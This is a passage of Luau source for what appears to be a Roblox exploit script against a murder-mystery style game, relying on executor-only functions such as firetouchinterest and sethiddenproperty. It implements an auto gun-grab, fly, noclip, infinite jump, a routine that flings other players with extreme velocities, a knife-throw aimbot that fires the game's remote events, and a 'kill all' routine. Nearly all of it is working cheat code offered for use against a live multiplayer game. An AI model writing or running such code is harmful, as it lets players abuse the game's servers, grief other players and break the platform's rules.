							list17[#list17 + 1] = { position = n2, aim = value56, cost = (n2 - pivot.Position).Magnitude }
						end
					end
				end
			end

			table.sort(list17, function(param41, param42)
				return param41.cost < param42.cost
			end)

			local n2 = os.clock() + 1.1

			for i = 1, math.min(#list17, 3) do
				if not (flag63 or os.clock() > n2) then
					local entry8 = list17[i]
					character2:PivotTo(CFrame.lookAt(entry8.position, entry8.aim))
					func63(3)
					local aim = func62(func58()) or entry8.aim
					value55 = aim
					flag63 = func53(flag57, value52, aim, obj9) or flag63
					task.wait(0.16)

					if func64() then
						flag63 = true
						break
					else
						continue
					end
				end

				break
			end
		end)

		pcall(function()
			character2:PivotTo(pivot)
		end)

		pcall(function()
			humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
			humanoidRootPart2.AssemblyAngularVelocity = Vector3.zero
		end)

		if value54 then
			pcall(value54)
		end

		if flag63 and value55 and _G.DrawBulletTracer then
			pcall(_G.DrawBulletTracer, humanoidRootPart2.Position + Vector3.new(0, 1.2, 0), value55, true)
		end

		if alignPosition and alignPosition.Parent then
			alignPosition.Enabled = enabled == true
			alignPosition.Position = humanoidRootPart2.Position
		end

		if antiFlingEnabled and _G.AntiFlingSetEnabled then
			_G.AntiFlingSetEnabled(true)
		end

		flag41 = false
		_G.ShootMurdererRageStatus = flag63 and "Wall shot fired" or "Rage shot failed"
		return flag63
	end
end

_G.AutoGrabGunEnabled = true
_G.AutoGrabGunStatus = "Waiting for dropped gun"

do
	local flag64 = false

	local function func66(instance9)
		if not instance9 or not instance9.Parent then
			return nil
		end

		if instance9:IsA("BasePart") then
			return instance9
		end
		return instance9:FindFirstChild("Handle") or instance9:FindFirstChildWhichIsA("BasePart", true)
	end

	local function func67()
		if not _G.InRound or not _G.__RealInRound then
			return false, "Out of round"
		end
		local character = localPlayer.Character
		local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
		if not character or not humanoid or humanoid.Health <= 0 then
			return false, "Player dead"
		end
		local flag65 = CurrentRoundClient.PlayerData[localPlayer.Name]
		if not flag65 or not flag65.Role or flag65.Dead then
			return false, "No active role"
		end

		if flag65.Role == "Murderer" then
			return false, "Disabled for Murderer"
		end

		if flag65.Role == "Lobby" then
			return false, "Out of round"
		end
		return true
	end

	local function func68(instance10, instance11)
		if type(firetouchinterest) ~= "function" then
			return false
		end
		local tbl29 = {}

		for _, item25 in ipairs({ "HumanoidRootPart", "UpperTorso", "Torso", "Head" }) do
			local obj12 = instance10:FindFirstChild(item25)

			if obj12 and obj12:IsA("BasePart") then
				table.insert(tbl29, obj12)
			end
		end

		local tbl30 = { instance11 }

		for _, descendant in ipairs(instance11.Parent:GetDescendants()) do
			if descendant:IsA("BasePart") and descendant ~= instance11 then
				table.insert(tbl30, descendant)
			end

			if not (#tbl30 >= 6) then
				continue
			end
			break
		end

		local flag66 = false

		for _, item26 in ipairs(tbl29) do
			for _, item27 in ipairs(tbl30) do
				local ok = pcall(function()
					firetouchinterest(item26, item27, 0)
					task.wait()
					firetouchinterest(item26, item27, 1)
				end)

				flag66 = flag66 or ok
			end
		end

		return flag66
	end

	local function func69()
		local value57 = flag64
		local flag67

		if flag64 then
			flag67 = value57
		else
			flag67 = not _G.AutoGrabGunEnabled
		end

		if flag67 then
			return false
		end
		local flag68, value58 = func67()
		if not flag68 then
			_G.AutoGrabGunStatus = value58
			return false
		end

		if func46() then
			_G.AutoGrabGunStatus = "Gun already owned"
			return false
		end
		local result8 = func11()
		local flag69 = func66(result8)
		local character = localPlayer.Character
		local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
		if not result8 or not flag69 or not character or not humanoid or humanoid.Health <= 0 then
			_G.AutoGrabGunStatus = "Waiting for dropped gun"
			return false
		end
		flag64 = true
		_G.AutoGrabGunStatus = "Grabbing gun"
		local flag70 = false

		for i = 1, 3 do
			flag70 = func68(character, flag69) or flag70
			task.wait(0.04)
			if not func46() then
				continue
			end
			break
		end

		local flag71 = func46() ~= nil
		_G.AutoGrabGunStatus = flag71 and "Gun collected without teleport" or flag70 and "No-teleport pickup retrying" or "firetouchinterest unavailable"
		flag64 = false
		return flag71
	end

	_G.AutoGrabGunSetEnabled = function(flag72)
		_G.AutoGrabGunEnabled = flag72 and true or false
		_G.AutoGrabGunStatus = _G.AutoGrabGunEnabled and "Waiting for dropped gun" or "Disabled"
	end

	local autoGrabGunLoopId = {}
	_G.__AutoGrabGunLoopId = autoGrabGunLoopId

	task.spawn(function()
		while _G.__AutoGrabGunLoopId == autoGrabGunLoopId do
			task.wait(0.08)

			if _G.AutoGrabGunEnabled and not flag64 then
				pcall(func69)
			end
		end
	end)
end

_G.PlayerWalkSpeed = 16
_G.PlayerJumpPower = 50
_G.PlayerFlyEnabled = false
_G.PlayerFlySpeed = 50

do
	local function func70()
		local character = localPlayer.Character
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
		character = character and character:FindFirstChildWhichIsA("Humanoid")

		if humanoidRootPart then
			local marbegPlayerFlyVelocity = humanoidRootPart:FindFirstChild("MarbegPlayerFlyVelocity")
			local marbegPlayerFlyGyro = humanoidRootPart:FindFirstChild("MarbegPlayerFlyGyro")

			if marbegPlayerFlyVelocity then
				marbegPlayerFlyVelocity:Destroy()
			end

			if marbegPlayerFlyGyro then
				marbegPlayerFlyGyro:Destroy()
			end
		end

		if character then
			character.PlatformStand = false
			character.AutoRotate = true
		end
	end

	_G.PlayerWalkSpeedSet = function(param43)
		_G.PlayerWalkSpeed = math.clamp(tonumber(param43) or 16, 16, 80)
	end

	_G.PlayerJumpPowerSet = function(param44)
		_G.PlayerJumpPower = math.clamp(tonumber(param44) or 50, 50, 200)
	end

	_G.PlayerFlySpeedSet = function(param45)
		_G.PlayerFlySpeed = math.clamp(tonumber(param45) or 50, 10, 200)
	end

	_G.PlayerFlySetEnabled = function(flag73)
		_G.PlayerFlyEnabled = flag73 and true or false

		if not _G.PlayerFlyEnabled then
			func70()
		end
	end

	_G.NoclipEnabled = false
	local tbl31 = {}
	local value59 = nil

	local function func71()
		for k, value60 in pairs(tbl31) do
			if k.Parent then
				pcall(function()
					k.CanCollide = value60
				end)
			end
		end

		table.clear(tbl31)
		value59 = nil
	end

	_G.NoclipSetEnabled = function(flag74)
		_G.NoclipEnabled = flag74 and true or false

		if not _G.NoclipEnabled then
			func71()
		end
	end

	table.insert(_G.CoinESPConn, RunService.PreSimulation:Connect(function()
		if not _G.NoclipEnabled or _G.AutoFarmEnabled then
			if not _G.NoclipEnabled and next(tbl31) then
				func71()
			end

			return
		end

		local character = localPlayer.Character
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
		if not character or not humanoidRootPart then
			return
		end

		if value59 ~= character then
			func71()
			value59 = character
		end

		for _, descendant in ipairs(character:GetDescendants()) do
			if descendant:IsA("BasePart") then
				if tbl31[descendant] == nil then
					tbl31[descendant] = descendant.CanCollide
				end

				if descendant.CanCollide then
					descendant.CanCollide = false
				end
			end
		end

		local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity

		if assemblyLinearVelocity.Y < 0 then
			local humanoid = character:FindFirstChildWhichIsA("Humanoid")
			local n2 = (humanoid and humanoid.HipHeight or 2) + humanoidRootPart.Size.Y * 0.5
			local raycastParams = RaycastParams.new()
			raycastParams.FilterType = Enum.RaycastFilterType.Exclude
			raycastParams.FilterDescendantsInstances = { character }
			raycastParams.IgnoreWater = true

			if workspace:Raycast(humanoidRootPart.Position, Vector3.new(0, -(n2 + 1.5), 0), raycastParams) then
				humanoidRootPart.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
			end
		end
	end))

	_G.InfiniteJumpEnabled = false
	_G.WallJumpEnabled = false

	_G.InfiniteJumpSetEnabled = function(flag75)
		_G.InfiniteJumpEnabled = flag75 and true or false
	end

	_G.WallJumpSetEnabled = function(flag76)
		_G.WallJumpEnabled = flag76 and true or false
	end

	local tbl32 = {}

	for i = 0, 7 do
		local num26 = math.rad(i * 45)
		local n2 = #tbl32 + 1
		local sin = math.sin
		tbl32[n2] = Vector3.new(math.cos(num26), 0, sin(num26))
	end

	local function func72(param46, part8)
		local raycastParams = RaycastParams.new()
		raycastParams.FilterType = Enum.RaycastFilterType.Exclude
		raycastParams.FilterDescendantsInstances = { param46 }
		raycastParams.IgnoreWater = true

		for _, item28 in ipairs(tbl32) do
			local hit = workspace:Raycast(part8.Position, item28 * 3.5, raycastParams)
			if hit and hit.Instance and hit.Instance.CanCollide then
				return true
			end
		end

		return false
	end

	table.insert(_G.CoinESPConn, UserInputService.JumpRequest:Connect(function()
		if _G.AutoFarmEnabled or _G.PlayerFlyEnabled then
			return
		end
		local character = localPlayer.Character
		local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
		if not humanoid or not humanoidRootPart or humanoid.Health <= 0 then
			return
		end

		if humanoid.FloorMaterial ~= Enum.Material.Air then
			return
		end

		if os.clock() - (_G.__LastAirJump or 0) < 0.2 then
			return
		end

		if not (_G.InfiniteJumpEnabled or _G.WallJumpEnabled and func72(character, humanoidRootPart)) then
			return
		end
		_G.__LastAirJump = os.clock()
		local jumpPower = humanoid.UseJumpPower and humanoid.JumpPower or math.sqrt(2 * workspace.Gravity * humanoid.JumpHeight)
		local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
		humanoidRootPart.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, jumpPower, assemblyLinearVelocity.Z)
		humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
	end))

	_G.BombBoostPower = 120

	_G.BombBoostSetPower = function(param47)
		_G.BombBoostPower = math.clamp(tonumber(param47) or 120, 40, 300)
	end

	local flag77 = false

	local function func73()
		local character = localPlayer.Character
		local backpack = localPlayer:FindFirstChild("Backpack")

		for _, item29 in ipairs({ character, backpack }) do
			if item29 then
				for _, child in ipairs(item29:GetChildren()) do
					if child:IsA("Tool") and string.find(string.lower(child.Name), "bomb", 1, true) then
						return child
					end
				end
			end
		end

		return nil
	end

	_G.BombBoost = function()
		if flag77 then
			return false, "Already boosting"
		end
		local character = localPlayer.Character
		local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
		if not character or not humanoid or not humanoidRootPart or humanoid.Health <= 0 then
			return false, "No character"
		end
		local result9 = func73()
		if not result9 then
			return false, "No bomb in inventory"
		end
		flag77 = true
		local flag78 = false

		local function func74()
			if flag78 then
				return
			end
			flag78 = true

			pcall(function()
				humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
				humanoidRootPart.AssemblyLinearVelocity = Vector3.new(humanoidRootPart.AssemblyLinearVelocity.X, _G.BombBoostPower, humanoidRootPart.AssemblyLinearVelocity.Z)
			end)
		end

		local connection2 = workspace.DescendantAdded:Connect(function(descendant)
			if descendant:IsA("Explosion") and humanoidRootPart.Parent then
				if (descendant.Position - humanoidRootPart.Position).Magnitude <= 30 then
					func74()
				end
			end
		end)

		pcall(function()
			if result9.Parent ~= character then
				humanoid:EquipTool(result9)
				task.wait(0.15)
			end

			result9:Activate()
		end)

		task.delay(0.35, function()
			func74()

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			task.wait(0.4)
			flag77 = false
		end)

		return true, "Boosting"
	end

	local connection2 = RunService.Heartbeat:Connect(function()
		local character = localPlayer.Character
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
		character = character and character:FindFirstChildWhichIsA("Humanoid")
		if not humanoidRootPart or not character or character.Health <= 0 then
			return
		end

		if not _G.AutoFarmEnabled and not _G.PlayerFlyEnabled then
			character.UseJumpPower = true
			character.WalkSpeed = _G.PlayerWalkSpeed
			character.JumpPower = _G.PlayerJumpPower
		end

		if not _G.PlayerFlyEnabled or _G.AutoFarmEnabled then
			func70()
			return
		end
		local marbegPlayerFlyVelocity = humanoidRootPart:FindFirstChild("MarbegPlayerFlyVelocity")

		if not marbegPlayerFlyVelocity then
			marbegPlayerFlyVelocity = Instance.new("BodyVelocity")
			marbegPlayerFlyVelocity.Name = "MarbegPlayerFlyVelocity"
			marbegPlayerFlyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
			marbegPlayerFlyVelocity.P = 12000
			marbegPlayerFlyVelocity.Parent = humanoidRootPart
		end

		local marbegPlayerFlyGyro = humanoidRootPart:FindFirstChild("MarbegPlayerFlyGyro")

		if not marbegPlayerFlyGyro then
			marbegPlayerFlyGyro = Instance.new("BodyGyro")
			marbegPlayerFlyGyro.Name = "MarbegPlayerFlyGyro"
			marbegPlayerFlyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			marbegPlayerFlyGyro.P = 9000
			marbegPlayerFlyGyro.D = 500
			marbegPlayerFlyGyro.Parent = humanoidRootPart
		end

		character.PlatformStand = true
		character.AutoRotate = false
		local currentCamera = workspace.CurrentCamera
		local vector = Vector3.zero

		if currentCamera then
			local vector2 = Vector3.new(currentCamera.CFrame.LookVector.X, 0, currentCamera.CFrame.LookVector.Z)
			local vector3 = Vector3.new(currentCamera.CFrame.RightVector.X, 0, currentCamera.CFrame.RightVector.Z)

			if vector2.Magnitude > 0 then
				vector2 = vector2.Unit
			end

			if vector3.Magnitude > 0 then
				vector3 = vector3.Unit
			end

			vector = Vector3.zero

			if UserInputService:IsKeyDown(Enum.KeyCode.W) then
				vector = Vector3.zero + vector2
			end

			if UserInputService:IsKeyDown(Enum.KeyCode.S) then
				vector -= vector2
			end

			if UserInputService:IsKeyDown(Enum.KeyCode.D) then
				vector += vector3
			end

			if UserInputService:IsKeyDown(Enum.KeyCode.A) then
				vector -= vector3
			end

			if vector.Magnitude == 0 then
				vector = character.MoveDirection

				if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
					vector += Vector3.new(0, currentCamera.CFrame.LookVector.Y * vector:Dot(vector2), 0)

					if character.Jump then
						vector += Vector3.new(0, 1, 0)
					end
				end
			end

			if UserInputService:IsKeyDown(Enum.KeyCode.Space) or UserInputService:IsKeyDown(Enum.KeyCode.E) then
				vector += Vector3.new(0, 1, 0)
			end

			if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) or UserInputService:IsKeyDown(Enum.KeyCode.Q) then
				vector -= Vector3.new(0, 1, 0)
			end

			local vector4 = Vector3.new(currentCamera.CFrame.LookVector.X, 0, currentCamera.CFrame.LookVector.Z)

			if vector4.Magnitude > 0 then
				marbegPlayerFlyGyro.CFrame = CFrame.lookAt(humanoidRootPart.Position, humanoidRootPart.Position + vector4.Unit)
			end
		end

		if vector.Magnitude > 1 then
			vector = vector.Unit
		end

		marbegPlayerFlyVelocity.Velocity = vector * _G.PlayerFlySpeed
	end)

	table.insert(_G.CoinESPConn, connection2)
end

_G.RoleFlingBusy = false
_G.RoleFlingStatus = "Ready"

_G.StopRoleFling = function()
	_G.__RoleFlingLoopId = nil
end

local function func75(list18)
	for _, item30 in ipairs(list18) do
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= localPlayer then
				local flag79 = CurrentRoundClient.PlayerData[player.Name]
				local character = player.Character
				local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
				character = character and character:FindFirstChild("HumanoidRootPart")
				if flag79 and flag79.Role == item30 and not flag79.Dead and humanoid and humanoid.Health > 0 and character then
					return player
				end
			end
		end
	end

	return nil
end

_G.FlingPlayerTarget = function(obj)
	if _G.RoleFlingBusy then
		return false, "Another fling is already running"
	end

	if _G.AutoFarmEnabled then
		return false, "Turn off Auto Farm first"
	end

	if not obj or obj == localPlayer or obj.Parent ~= Players then
		return false, "Player not found"
	end
	local character = localPlayer.Character
	local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
	local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
	local character2 = obj.Character
	local humanoid2 = character2 and character2:FindFirstChildWhichIsA("Humanoid")
	local humanoidRootPart2 = character2 and character2:FindFirstChild("HumanoidRootPart")
	if not character or not humanoid or humanoid.Health <= 0 or not humanoidRootPart then
		return false, "Your character is unavailable"
	end

	if not character2 or not humanoid2 or humanoid2.Health <= 0 or not humanoidRootPart2 then
		return false, "Target is unavailable"
	end
	local roleFlingLoopId = {}
	_G.__RoleFlingLoopId = roleFlingLoopId
	_G.RoleFlingBusy = true
	_G.RoleFlingStatus = "Flinging " .. obj.Name

	task.spawn(function()
		local pivot = character:GetPivot()
		local antiFlingEnabled2 = _G.AntiFlingEnabled == true
		local playerFlyEnabled = _G.PlayerFlyEnabled == true
		local platformStand = humanoid.PlatformStand
		local autoRotate = humanoid.AutoRotate
		local stateEnabled = humanoid:GetStateEnabled(Enum.HumanoidStateType.Seated)
		local primaryPart = character.PrimaryPart
		local fallenPartsDestroyHeight = workspace.FallenPartsDestroyHeight
		local bodyVelocity = nil
		local flag80 = false

		if playerFlyEnabled and _G.PlayerFlySetEnabled then
			_G.PlayerFlySetEnabled(false)
		end

		if antiFlingEnabled2 and _G.AntiFlingSetEnabled then
			_G.AntiFlingSetEnabled(false)
		end

		pcall(function()
			if type(setsimulationradius) == "function" then
				setsimulationradius(math.huge, math.huge)
			end

			if type(sethiddenproperty) == "function" then
				sethiddenproperty(localPlayer, "SimulationRadius", math.huge)
			end
		end)

		task.wait(0.05)

		local ok, result = pcall(function()
			character.PrimaryPart = humanoidRootPart
			workspace.FallenPartsDestroyHeight = (0/0)
			humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
			bodyVelocity = Instance.new("BodyVelocity")
			bodyVelocity.Name = "MarbegFlingVelocity"
			bodyVelocity.Velocity = Vector3.new(900000000, 900000000, 900000000)
			bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
			bodyVelocity.Parent = humanoidRootPart
			local now = os.clock()
			local n2 = 0

			local function func76(num27, num28)
				n2 += 100
				local cFrame = CFrame.new(humanoidRootPart2.Position) * num27 * num28
				humanoidRootPart.CFrame = cFrame
				character:SetPrimaryPartCFrame(cFrame)
				humanoidRootPart.Velocity = Vector3.new(90000000, 900000000, 90000000)
				humanoidRootPart.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
				task.wait()
			end

			while true do
				if _G.__RoleFlingLoopId == roleFlingLoopId and os.clock() - now < 2.4 then
					character2 = obj.Character
					humanoid2 = character2 and character2:FindFirstChildWhichIsA("Humanoid")
					humanoidRootPart2 = character2 and character2:FindFirstChild("HumanoidRootPart")

					if not (not humanoidRootPart2 or not humanoid2 or humanoid2.Health <= 0) then
						if humanoidRootPart2.Velocity.Magnitude > 500 then
							flag80 = true
							break
						else
							local n3 = humanoid2.MoveDirection * humanoidRootPart2.Velocity.Magnitude / 1.25
							local cframe = CFrame.Angles(math.rad(n2), 0, 0)
							func76(CFrame.new(0, 1.5, 0) + n3, cframe)
							func76(CFrame.new(0, -1.5, 0) + n3, cframe)
							func76(CFrame.new(2.25, 1.5, -2.25) + n3, cframe)
							func76(CFrame.new(-2.25, -1.5, 2.25) + n3, cframe)
							local moveDirection = humanoid2.MoveDirection
							func76(CFrame.new(0, 1.5, 0) + moveDirection, cframe)
							local moveDirection2 = humanoid2.MoveDirection
							func76(CFrame.new(0, -1.5, 0) + moveDirection2, cframe)
							continue
						end
					end
				end

				break
			end

			if humanoidRootPart2 and humanoidRootPart2.Velocity.Magnitude > 500 then
				flag80 = true
			end
		end)

		if bodyVelocity and bodyVelocity.Parent then
			bodyVelocity:Destroy()
		end

		workspace.FallenPartsDestroyHeight = fallenPartsDestroyHeight
		humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, stateEnabled)

		pcall(function()
			humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
			humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
			humanoidRootPart.Velocity = Vector3.zero
			humanoidRootPart.RotVelocity = Vector3.zero
			character:PivotTo(pivot + Vector3.new(0, 0.5, 0))
			character.PrimaryPart = primaryPart
			humanoid.PlatformStand = platformStand
			humanoid.AutoRotate = autoRotate
			humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
		end)

		if antiFlingEnabled2 and _G.AntiFlingSetEnabled then
			_G.AntiFlingSetEnabled(true)
		end

		if playerFlyEnabled and _G.PlayerFlySetEnabled then
			_G.PlayerFlySetEnabled(true)
		end

		if _G.__RoleFlingLoopId == roleFlingLoopId then
			_G.__RoleFlingLoopId = nil
		end

		_G.RoleFlingBusy = false

		if not ok then
			_G.RoleFlingStatus = "Fling failed: " .. tostring(result)
		elseif flag80 then
			_G.RoleFlingStatus = "Fling worked: " .. obj.Name
		else
			_G.RoleFlingStatus = "Server blocked fling: " .. obj.Name
		end

		if _G.WindNotify then
			_G.WindNotify("Fling Result", _G.RoleFlingStatus, flag80 and "circle-check" or "shield-x")
		end
	end)

	return true, "Targeting " .. obj.Name
end

_G.RoleFlingTarget = function(param48)
	if not _G.InRound or not _G.__RealInRound then
		return false, "No active round"
	end
	local flag81 = func75(param48)
	if not flag81 then
		return false, "Role target not found"
	end
	return _G.FlingPlayerTarget(flag81)
end

_G.AntiFlingEnabled = true
_G.AntiFlingStatus = "Protected"

do
	local obj = setmetatable({}, { __mode = "k" })
	local cFrame = nil
	local value61 = nil
	local n2 = 0

	local function func77()
		for k, value62 in pairs(obj) do
			if k and k.Parent then
				pcall(function()
					k.CanCollide = value62
				end)
			end

			obj[k] = nil
		end
	end

	_G.AntiFlingSetEnabled = function(flag82)
		_G.AntiFlingEnabled = flag82 and true or false
		_G.AntiFlingStatus = _G.AntiFlingEnabled and "Protected" or "Disabled"

		if not _G.AntiFlingEnabled then
			func77()
			cFrame = nil
			value61 = nil
			n2 = 0
		end
	end

	local n3 = 0

	local connection2 = RunService.Heartbeat:Connect(function(deltaTime)
		if not _G.AntiFlingEnabled then
			return
		end
		n3 += deltaTime
		if n3 < 0.03 then
			return
		end
		n3 = 0
		local character = localPlayer.Character
		local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
		if not character or not humanoid or humanoid.Health <= 0 or not humanoidRootPart then
			return
		end

		if value61 ~= character then
			value61 = character
			cFrame = humanoidRootPart.CFrame
		end

		local antiFlingParts = _G.__AntiFlingParts

		if not antiFlingParts then
			antiFlingParts = setmetatable({}, { __mode = "k" })
			_G.__AntiFlingParts = antiFlingParts
		end

		for _, player in ipairs(Players:GetPlayers()) do
			local character2 = player ~= localPlayer and player.Character

			if character2 then
				local entry9 = antiFlingParts[character2]

				if not entry9 or entry9.dirty then
					if entry9 and entry9.conns then
						for _, conn in ipairs(entry9.conns) do
							conn:Disconnect()
						end
					end

					entry9 = { parts = {}, dirty = false }

					for _, descendant in ipairs(character2:GetDescendants()) do
						if descendant:IsA("BasePart") then
							entry9.parts[#entry9.parts + 1] = descendant
						end
					end

					local function func78(descendant)
						if descendant:IsA("BasePart") then
							entry9.dirty = true
						end
					end

					local descendantRemoving = character2.DescendantRemoving
					local connect = descendantRemoving.Connect
					entry9.conns = { character2.DescendantAdded:Connect(func78), connect(descendantRemoving, func78) }
					antiFlingParts[character2] = entry9
				end

				for _, part in ipairs(entry9.parts) do
					if part.CanCollide then
						if obj[part] == nil then
							obj[part] = true
						end

						part.CanCollide = false
					end
				end
			end
		end

		local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
		local magnitude = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z).Magnitude
		local magnitude2 = humanoidRootPart.AssemblyAngularVelocity.Magnitude
		local flag83 = not _G.PlayerFlyEnabled

		if flag83 then
			flag83 = magnitude > 95 or magnitude2 > 55 or assemblyLinearVelocity.Y > 120
		end

		local now = os.clock()

		if flag83 and now >= n2 then
			n2 = now + 0.85
			humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
			humanoidRootPart.AssemblyAngularVelocity = Vector3.zero

			if cFrame then
				character:PivotTo(cFrame)
			end

			humanoid.PlatformStand = false
			humanoid.Sit = false
			humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
			_G.AntiFlingStatus = "Fling blocked"
		else
			if humanoid.FloorMaterial ~= Enum.Material.Air and magnitude < 45 and magnitude2 < 18 then
				cFrame = humanoidRootPart.CFrame
			end

			if n2 <= now then
				_G.AntiFlingStatus = "Protected"
			end
		end
	end)

	table.insert(_G.CoinESPConn, connection2)
end

_G.AutoThrowKnifeEnabled = false
_G.AutoThrowKnifeStatus = "Disabled"

do
	local n2 = 0

	local function func79(instance12)
		if not instance12 or not instance12:IsA("Tool") then
			return nil
		end
		local events = instance12:FindFirstChild("Events")
		events = events and events:FindFirstChild("KnifeThrown")
		local handle = instance12:FindFirstChild("Handle")
		if events and events:IsA("RemoteEvent") and handle and handle:IsA("BasePart") then
			return instance12, handle, events
		end
		return nil
	end

	local function func80(param49)
		local character = localPlayer.Character
		if not character then
			return nil
		end

		for _, child in ipairs(character:GetChildren()) do
			local value63, value64, value65 = func79(child)
			if value63 then
				return value63, value64, value65
			end
		end

		if param49 then
			local backpack = localPlayer:FindFirstChild("Backpack")
			local humanoid = character:FindFirstChildWhichIsA("Humanoid")

			if backpack and humanoid then
				for _, child in ipairs(backpack:GetChildren()) do
					if func79(child) then
						humanoid:EquipTool(child)
						task.wait(0.12)
						return func79(child)
					end
				end
			end
		end

		return nil
	end

	local function func81(flag84)
		local character = localPlayer.Character
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
		if not humanoidRootPart or not flag84 then
			return nil
		end
		local huge = math.huge
		local value66 = nil
		local value67 = nil
		local value68 = nil

		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= localPlayer then
				local character2 = player.Character
				local humanoid = character2 and character2:FindFirstChildWhichIsA("Humanoid")
				local humanoidRootPart2 = character2 and character2:FindFirstChild("HumanoidRootPart")
				local value69 = nil

				if humanoidRootPart2 then
					local value70
					value70, value69 = func47(flag84, character2, character)
				end

				if humanoid and humanoid.Health > 0 and humanoidRootPart2 and value69 then
					local magnitude = (humanoidRootPart2.Position - humanoidRootPart.Position).Magnitude

					if magnitude < huge then
						huge = magnitude
						value66 = player
						value67 = humanoidRootPart2
						value68 = value69
					end
				end
			end
		end

		return value66, value67, huge, value68
	end

	_G.ThrowAimbotOnce = function()
		if not _G.InRound then
			return false, "Not in round"
		end
		local obj13, value71, obj14 = func80(true)
		if not obj13 then
			return false, "No knife in inventory"
		end
		local flag85, flag86, value72, flag87 = func81(value71.Position)
		local character = flag85 and flag85.Character
		if not flag85 or not flag86 or not character or not flag87 then
			return false, "No visible target"
		end
		local position4 = func48(value71.Position, character, flag86, flag87, localPlayer.Character)
		local n3 = math.max(0.85, (tonumber(obj13:GetAttribute("ThrowSpeed")) or 0.5) * 2)
		if os.clock() - n2 < n3 then
			return false, "Knife cooling down"
		end

		if not pcall(function()
			obj14:FireServer(value71.CFrame, CFrame.new(position4))
		end) then
			return false, "Remote error"
		end
		n2 = os.clock()
		return true, flag85.Name .. " @ " .. math.floor(value72) .. " studs"
	end

	_G.AutoThrowKnifeSetEnabled = function(flag88)
		_G.AutoThrowKnifeEnabled = flag88 and true or false
		_G.AutoThrowKnifeStatus = _G.AutoThrowKnifeEnabled and "Waiting for equipped knife" or "Disabled"
	end

	local autoThrowKnifeLoopId = {}
	_G.__AutoThrowKnifeLoopId = autoThrowKnifeLoopId

	task.spawn(function()
		while _G.__AutoThrowKnifeLoopId == autoThrowKnifeLoopId do
			task.wait(0.04)

			if not (not _G.AutoThrowKnifeEnabled or not _G.InRound) then
				local obj15, value73, obj16 = func80()

				if not obj15 then
					_G.AutoThrowKnifeStatus = "Equip the knife"
				else
					local flag89, flag90, value74, flag91 = func81(value73.Position)
					local character = flag89 and flag89.Character

					if not flag89 or not flag90 or not character or not flag91 then
						_G.AutoThrowKnifeStatus = "No visible target"
					else
						local position5 = func48(value73.Position, character, flag90, flag91, localPlayer.Character)
						local n3 = math.max(0.85, (tonumber(obj15:GetAttribute("ThrowSpeed")) or 0.5) * 2)

						if not (os.clock() - n2 < n3) then
							if pcall(function()
								obj16:FireServer(value73.CFrame, CFrame.new(position5))
							end) then
								n2 = os.clock()
								_G.AutoThrowKnifeStatus = flag89.Name .. " @ " .. math.floor(value74) .. " studs"
							else
								_G.AutoThrowKnifeStatus = "Remote error"
							end
						end
					end
				end
			end
		end
	end)

	_G.KillAllBusy = false
	_G.KillAllStatus = "Ready"

	_G.KillAllMurderer = function()
		if _G.KillAllBusy then
			return false, "Already running"
		end

		if not _G.InRound then
			return false, "Not in round"
		end
		local flag92 = CurrentRoundClient.PlayerData[localPlayer.Name]
		if not flag92 or flag92.Role ~= "Murderer" or flag92.Dead then
			return false, "Murderer role required"
		end
		local obj17 = func80(true)
		if not obj17 then
			return false, "Knife unavailable"
		end
		local events = obj17:FindFirstChild("Events")
		local knifeStabbed = events and events:FindFirstChild("KnifeStabbed")
		local handleTouched = events and events:FindFirstChild("HandleTouched")
		if not knifeStabbed or not knifeStabbed:IsA("RemoteEvent") or not handleTouched or not handleTouched:IsA("RemoteEvent") then
			return false, "Stab remotes unavailable"
		end
		_G.KillAllBusy = true
		_G.KillAllStatus = "Running"
		local killAllLoopId = {}
		_G.__KillAllLoopId = killAllLoopId

		task.spawn(function()
			local tbl33 = {}

			for _, player in ipairs(Players:GetPlayers()) do
				if not (_G.__KillAllLoopId ~= killAllLoopId or not _G.InRound) then
					if player ~= localPlayer then
						local flag93 = CurrentRoundClient.PlayerData[player.Name]
						local character = player.Character
						local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")

						if character then
							character = character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso") or character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Head")
						end

